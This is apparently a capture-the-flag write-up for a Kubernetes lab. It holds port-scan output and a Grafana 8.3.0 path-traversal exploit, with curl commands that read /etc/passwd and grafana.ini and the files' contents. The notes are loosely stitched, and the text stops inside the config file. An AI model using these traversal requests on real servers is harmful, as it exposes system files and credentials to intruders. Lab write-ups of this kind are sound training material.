---
A Kubernetes hacking challenge for DevOps/SRE enthusiasts.
---

![](https://cncf-branding.netlify.app/img/projects/kubernetes/horizontal/color/kubernetes-horizontal-color.svg)

### Access the Cluster

 Start Machine

To access a cluster, you need to know the location of the K8s cluster and have credentials to access it. Compromise the cluster and best of luck.

Use Nmap to find open ports and gain a foothold by exploiting a vulnerable service. If you are new at Nmap, take a look at the [Nmap room](https://tryhackme.com/room/furthernmap).  

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.249.171 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.249.171:22
Open 10.10.249.171:111
Open 10.10.249.171:3000
Open 10.10.249.171:5000
Open 10.10.249.171:6443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 10:44 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:44
Completed Parallel DNS resolution of 1 host. at 10:44, 2.01s elapsed
DNS resolution of 1 IPs took 2.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:44
Scanning 10.10.249.171 [5 ports]
Discovered open port 22/tcp on 10.10.249.171
Discovered open port 111/tcp on 10.10.249.171
Discovered open port 3000/tcp on 10.10.249.171
Discovered open port 5000/tcp on 10.10.249.171
Discovered open port 6443/tcp on 10.10.249.171
Completed Connect Scan at 10:44, 0.20s elapsed (5 total ports)
Initiating Service scan at 10:44
Scanning 5 services on 10.10.249.171
Completed Service scan at 10:46, 111.33s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.249.171.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 8.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 1.33s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
Nmap scan report for 10.10.249.171
Host is up, received user-set (0.20s latency).
Scanned at 2023-01-09 10:44:27 EST for 122s

PORT     STATE SERVICE           REASON  VERSION
22/tcp   open  ssh               syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e235e14f4e87459e5f2c97e0daa9dfd5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTRQx4ZmXMByEs6dg4VTz+UtM9X9Ljxt6SU3oceqRUlV+ohx56xdD0ZPbvD0IcYwUrrqcruMG0xxgRxWuzV+FQAJVQe76ED966+lwrwAnUsVFQ5apw3N+WKnD53eldUZRq7/2nGQQizrefY7UjAGX/EZonSVOWZyhVyONu2VBBwg0B0yA3UBZV+yg+jGsrZ9ETEmfNbQRkbodEAwoZrGQ87UEdTkfj+5TGmfzqgukmBvvVV7KoXgSQIZNkqRmkAVKKXeEfydnOR37KMglBUXIR/50jkIswxWbNk2OtS6fz6UiPeEY39f4f0gwLx/HwUyel9yzH4dkDb+LBS6X/X9b9
|   256 b2fd9b751c9e80195d134e8da0837bf9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqCgW5Mlx2VpC61acc0G4VMZUAauQDoK5xIzdHzdDLPXt0GqsoIw1fuwTSSzSy8RFmGU5PNHiWn0egoUwlXdc4=
|   256 75200b4314a98a491ad92933e1b91ab6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFZ/jrfDX1aK1I0A/sLRVb2qoCF9xHWbVW+gBCV8dSmg
111/tcp  open  rpcbind           syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3000/tcp open  ppp?              syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Jan 2023 15:45:10 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Jan 2023 15:44:34 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Jan 2023 15:44:42 GMT
|_    Content-Length: 0
5000/tcp open  http              syn-ack Werkzeug httpd 2.0.2 (Python 3.8.12)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.12
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Etch a Sketch
6443/tcp open  ssl/sun-sr-https? syn-ack
| ssl-cert: Subject: commonName=kubernetes/organizationName=kubernetes
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.svc.cluster.local, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.249.171, IP Address:FE80:0:0:0:AE:7CFF:FE0C:4991, IP Address:10.96.0.1
| Issuer: commonName=kubernetes-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-09T15:35:00
| Not valid after:  2024-01-09T15:35:00
| MD5:   50de96bca5e1118e4ae70020181f6ee8
| SHA-1: ca1ce9b8197bfe2535f8906d0018858e8faea313
| -----BEGIN CERTIFICATE-----
| MIIEBjCCAu6gAwIBAgIUV+XyCwxqBXodXzWwe49LnTH9MaswDQYJKoZIhvcNAQEL
| BQAwGDEWMBQGA1UEAxMNa3ViZXJuZXRlcy1jYTAeFw0yMzAxMDkxNTM1MDBaFw0y
| NDAxMDkxNTM1MDBaMCoxEzARBgNVBAoTCmt1YmVybmV0ZXMxEzARBgNVBAMTCmt1
| YmVybmV0ZXMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDYisMDsUqx
| HQ2i2J+37wzEp0/2jZ+ergYuHOoyGT5VnKP9rGI5k2nz7L0YLlWOP5i6WY/js26K
| ysM5hJXkALU+ZTjgEWFwcmru7QZp1lnetua4hBpkqXd2UwLxOMywLD3WhhjZKsk1
| f7tL1U+002Seqk+Ypi193/RCzgRCujeRL5+kiPSYE2yRgsmDvKR7oK3Pdsdk/+1v
| S1WgGu2egczC26UYKRMo3iKbRvUQFM5nAI3O79XIYoPZ4nmw32ZPKo8BYmOx1dWZ
| fHIQUwVcY3YsG3yFNM5fxReT8+VVx7ri51jEv+KndSrUAvwIY3ukzsxhxXEZHgam
| t3KbuouVVXy9AgMBAAGjggE0MIIBMDAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYw
| FAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFDTX
| ZTn25QUifZGWpQFQYsSQwcMyMB8GA1UdIwQYMBaAFFBlWtnEKpRN3QwmW51wacf+
| ooswMIGwBgNVHREEgagwgaWCCmt1YmVybmV0ZXOCEmt1YmVybmV0ZXMuZGVmYXVs
| dIIWa3ViZXJuZXRlcy5kZWZhdWx0LnN2Y4Iea3ViZXJuZXRlcy5kZWZhdWx0LnN2
| Yy5jbHVzdGVyghxrdWJlcm5ldGVzLnN2Yy5jbHVzdGVyLmxvY2Fsgglsb2NhbGhv
| c3SHBH8AAAGHBAoK+auHEP6AAAAAAAAAAK58//4MSZGHBApgAAEwDQYJKoZIhvcN
| AQELBQADggEBAIZgj1Vb2irJafp63EAl5lA/mK9SkcQYZVqZSfDf9ot/7HqD31+x
| MDVXBBf+vyzq5oJ+2F1OtaDM8EVdOSN53vHEH1h0WB54XFnDJPRaG30LofcoTRaf
| bgA5jNYy+6I+ilnPzENoUoupSTFsxnen0svBtVYWD+HMhUkoLSp30VkuQ1FeVNv6
| ojNobPlT/jEUui5ey85Agq/0exhi5V495iYv5ooTxlGpU8ounVl18E1VFHamCygI
| eUYpVLG+I6rjAK2CqXEKA437S9eM1MvsvUrT+kcKuC9Ah0cWJeXAPg3omLb5kEAH
| 2whZDytsGBV/dNLCHnruVzDiI3zDiP632PM=
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 90588589-9089-47ff-a8ec-003070ba7994
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 09 Jan 2023 15:45:16 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: fe3aaa6f-75f1-4566-a0b0-ad5028ef998b
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 09 Jan 2023 15:44:42 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: cca78da1-b5d3-4152-8cb2-f2a04b20f70d
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 09 Jan 2023 15:44:43 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.93%I=7%D=1/9%Time=63BC3662%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Control
SF::\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpire
SF:s:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\x
SF:20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content
SF:-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protecti
SF:on:\x201;\x20mode=block\r\nDate:\x20Mon,\x2009\x20Jan\x202023\x2015:44:
SF:34\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</
SF:a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCach
SF:e-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPrag
SF:ma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOn
SF:ly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Op
SF:tions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon
SF:,\x2009\x20Jan\x202023\x2015:44:42\x20GMT\r\nContent-Length:\x200\r\n\r
SF:\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\r
SF:\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=
SF:utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r
SF:\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt%
SF:252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;\
SF:x20mode=block\r\nDate:\x20Mon,\x2009\x20Jan\x202023\x2015:45:10\x20GMT\
SF:r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6443-TCP:V=7.93%T=SSL%I=7%D=1/9%Time=63BC366A%P=x86_64-pc-linux-gnu
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,14A,"HTTP/1\.0\x20401\x20Unauthorized\r\n
SF:Audit-Id:\x20fe3aaa6f-75f1-4566-a0b0-ad5028ef998b\r\nCache-Control:\x20
SF:no-cache,\x20private\r\nContent-Type:\x20application/json\r\nDate:\x20M
SF:on,\x2009\x20Jan\x202023\x2015:44:42\x20GMT\r\nContent-Length:\x20129\r
SF:\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"stat
SF:us\":\"Failure\",\"message\":\"Unauthorized\",\"reason\":\"Unauthorized
SF:\",\"code\":401}\n")%r(HTTPOptions,14A,"HTTP/1\.0\x20401\x20Unauthorize
SF:d\r\nAudit-Id:\x20cca78da1-b5d3-4152-8cb2-f2a04b20f70d\r\nCache-Control
SF::\x20no-cache,\x20private\r\nContent-Type:\x20application/json\r\nDate:
SF:\x20Mon,\x2009\x20Jan\x202023\x2015:44:43\x20GMT\r\nContent-Length:\x20
SF:129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\
SF:"status\":\"Failure\",\"message\":\"Unauthorized\",\"reason\":\"Unautho
SF:rized\",\"code\":401}\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Ter
SF:minalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,14A
SF:,"HTTP/1\.0\x20401\x20Unauthorized\r\nAudit-Id:\x2090588589-9089-47ff-a
SF:8ec-003070ba7994\r\nCache-Control:\x20no-cache,\x20private\r\nContent-T
SF:ype:\x20application/json\r\nDate:\x20Mon,\x2009\x20Jan\x202023\x2015:45
SF::16\x20GMT\r\nContent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"apiV
SF:ersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"Un
SF:authorized\",\"reason\":\"Unauthorized\",\"code\":401}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.33 seconds


http://10.10.249.171:3000
Grafana login
"version":"8.3.0" (searching for an exploit)
https://www.exploit-db.com/exploits/50581

Directory Traversal
url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read

plugin_list = [
    "alertlist",


--path-as-is

Tell  curl to not handle sequences of /../ or /./ in the given URL path. Normally curl will squash or merge them according to standards but with this option set you tell it not to do that.
Example:
        curl --path-as-is https://example.com/../../etc/passwd

Grafana es un software libre basado en licencia de Apache 2.0, ​ que permite la visualización y el formato de datos métricos. Permite crear cuadros de mando y gráficos a partir de múltiples fuentes, incluidas bases de datos de series de tiempo como Graphite, InfluxDB y OpenTSDB.​​

https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/

from 8 to more

┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://10.10.249.171:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd        
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:hereiamatctf907:/home/grafana:/sbin/nologin 


┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://10.10.249.171:3000/public/plugins/alertlist/../../../../../../../../../../etc/grafana/grafana.ini
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change

# possible values : production, development
;app_mode = production

# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}

#################################### Paths ####################################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana

# Temporary files in `data` directory older than given duration will be removed
;temp_data_lifetime = 24h

# Directory where grafana can store logs
;logs = /var/log/grafana

# Directory where grafana will automatically scan and look for plugins
;plugins = /var/lib/grafana/plugins

# folder that contains provisioning config files that grafana will apply on startup and while running.
;provisioning = conf/provisioning

#################################### Server ####################################
[server]
# Protocol (http, https, h2, socket)
;protocol = http

# The ip address to bind to, empty will bind to all interfaces
;http_addr =

# The http port  to use
;http_port = 3000

# The public facing domain name used to access grafana from a browser
;domain = localhost

# Redirect to correct domain if host header does not match domain
# Prevents DNS rebinding attacks
;enforce_domain = false

# The full public facing url you use in browser, used for redirects and emails
# If you use reverse proxy and sub path specify full url (with sub path)
;root_url = %(protocol)s://%(domain)s:%(http_port)s/

# Serve Grafana from subpath specified in `root_url` setting. By default it is set to `false` for compatibility reasons.
;serve_from_sub_path = false

# Log web requests
;router_logging = false

# the path relative working path
;static_root_path = public

# enable gzip
;enable_gzip = false

# https certs & key file
;cert_file =
;cert_key =

# Unix socket path
;socket =

# CDN Url
;cdn_url =

# Sets the maximum time using a duration format (5s/5m/5ms) before timing out read of an incoming request and closing idle connections.
# `0` means there is no timeout for reading the request.
;read_timeout = 0

#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =

# Use either URL or the previous fields to configure the database
# Example: mysql://user:secret@host:port/database
;url =

# For "postgres" only, either "disable", "require" or "verify-full"
;ssl_mode = disable

# Database drivers may support different transaction isolation levels.
# Currently, only "mysql" driver supports isolation levels.
# If the value is empty - driver's default isolation level is applied.
# For "mysql" use "READ-UNCOMMITTED", "READ-COMMITTED", "REPEATABLE-READ" or "SERIALIZABLE".
;isolation_level =

;ca_cert_path =
;client_key_path =
;client_cert_path =
;server_cert_name =

# For "sqlite3" only, path relative to data_path setting
;path = grafana.db

# Max idle conn setting default is 2
;max_idle_conn = 2

# Max conn setting default is 0 (mean not set)
;max_open_conn =

# Connection Max Lifetime default is 14400 (means 14400 seconds or 4 hours)
;conn_max_lifetime = 14400

# Set to true to log the sql calls and execution times.
;log_queries =

# For "sqlite3" only. cache mode setting used for connecting to the database. (private, shared)
;cache_mode = private

################################### Data sources #########################
[datasources]
# Upper limit of data sources that Grafana will return. This limit is a temporary configuration and it will be deprecated when pagination will be introduced on the list data sources API.
;datasource_limit = 5000

#################################### Cache server #############################
[remote_cache]
# Either "redis", "memcached" or "database" default is "database"
;type = database

# cache connectionstring options
# database: will use Grafana primary database.
# redis: config like redis server e.g. `addr=127.0.0.1:6379,pool_size=100,db=0,ssl=false`. Only addr is required. ssl may be 'true', 'false', or 'insecure'.
# memcache: 127.0.0.1:11211
;connstr =

#################################### Data proxy ###########################
[dataproxy]

# This enables data proxy logging, default is false
;logging = false

# How long the data proxy waits to read the headers of the response before timing out, default is 30 seconds.
# This setting also applies to core backend HTTP data sources where query requests use an HTTP client with timeout set.
;timeout = 30

# How long the data proxy waits to establish a TCP connection before timing out, default is 10 seconds.
;dialTimeout = 10

# How many seconds the data proxy waits before sending a keepalive probe request.
;keep_alive_seconds = 30

# How many seconds the data proxy waits for a successful TLS Handshake before timing out.
;tls_handshake_timeout_seconds = 10

# How many seconds the data proxy will wait for a server's first response headers after
# fully writing the request headers if the request has an "Expect: 100-continue"
# header. A value of 0 will result in the body being sent immediately, without
# waiting for the server to approve.
;expect_continue_timeout_seconds = 1

# Optionally limits the total number of connections per host, including connections in the dialing,
# active, and idle states. On limit violation, dials will block.
# A value of zero (0) means no limit.
;max_conns_per_host = 0

# The maximum number of idle connections that Grafana will keep alive.
;max_idle_connections = 100

# How many seconds the data proxy keeps an idle connection open before timing out.
;idle_conn_timeout_seconds = 90

# If enabled and user is not anonymous, data proxy will add X-Grafana-User header with username into the request, default is false.
;send_user_header = false

# Limit the amount of bytes that will be read/accepted from responses of outgoing HTTP requests.
;response_limit = 0

# Limits the number of rows that Grafana will process from SQL data sources.
;row_limit = 1000000

#################################### Analytics ####################################
[analytics]
# Server reporting, sends usage counters to stats.grafana.org every 24 hours.
# No ip addresses are being tracked, only simple counters to track
# running instances, dashboard and error counts. It is very helpful to us.
# Change this option to false to disable reporting.
;reporting_enabled = true

# The name of the distributor of the Grafana instance. Ex hosted-grafana, grafana-labs
;reporting_distributor = grafana-labs

# Set to false to disable all checks to https://grafana.net
# for new versions (grafana itself and plugins), check is used
# in some UI views to notify that grafana or plugin update exists
# This option does not cause any auto updates, nor send any information
# only a GET request to http://grafana.com to get latest versions
;check_for_updates = true

# Google Analytics universal tracking code, only enabled if you specify an id here
;google_analytics_ua_id =

# Google Tag Manager ID, only enabled if you specify an id here
;google_tag_manager_id =

#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm

# current key provider used for envelope encryption, default to static value specified by secret_key
;encryption_provider = secretKey

# list of configured key providers, space separated (Enterprise only): e.g., awskms.v1 azurekv.v1
;available_encryption_providers =

# disable gravatar profile images
;disable_gravatar = false

# data source proxy whitelist (ip_or_domain:port separated by spaces)
;data_source_proxy_whitelist =

# disable protection against brute force login attempts
;disable_brute_force_login_protection = false

# set to true if you host Grafana behind HTTPS. default is false.
;cookie_secure = false

# set cookie SameSite attribute. defaults to `lax`. can be set to "lax", "strict", "none" and "disabled"
;cookie_samesite = lax

# set to true if you want to allow browsers to render Grafana in a <frame>, <iframe>, <embed> or <object>. default is false.
;allow_embedding = false

# Set to true if you want to enable http strict transport security (HSTS) response header.
# This is only sent when HTTPS is enabled in this configuration.
# HSTS tells browsers that the site should only be accessed using HTTPS.
;strict_transport_security = false

# Sets how long a browser should cache HSTS. Only applied if strict_transport_security is enabled.
;strict_transport_security_max_age_seconds = 86400

# Set to true if to enable HSTS preloading option. Only applied if strict_transport_security is enabled.
;strict_transport_security_preload = false

# Set to true if to enable the HSTS includeSubDomains option. Only applied if strict_transport_security is enabled.
;strict_transport_security_subdomains = false

# Set to true to enable the X-Content-Type-Options response header.
# The X-Content-Type-Options response HTTP header is a marker used by the server to indicate that the MIME types advertised
# in the Content-Type headers should not be changed and be followed.
;x_content_type_options = true

# Set to true to enable the X-XSS-Protection header, which tells browsers to stop pages from loading
# when they detect reflected cross-site scripting (XSS) attacks.
;x_xss_protection = true

# Enable adding the Content-Security-Policy header to your requests.
# CSP allows to control resources the user agent is allowed to load and helps prevent XSS attacks.
;content_security_policy = false

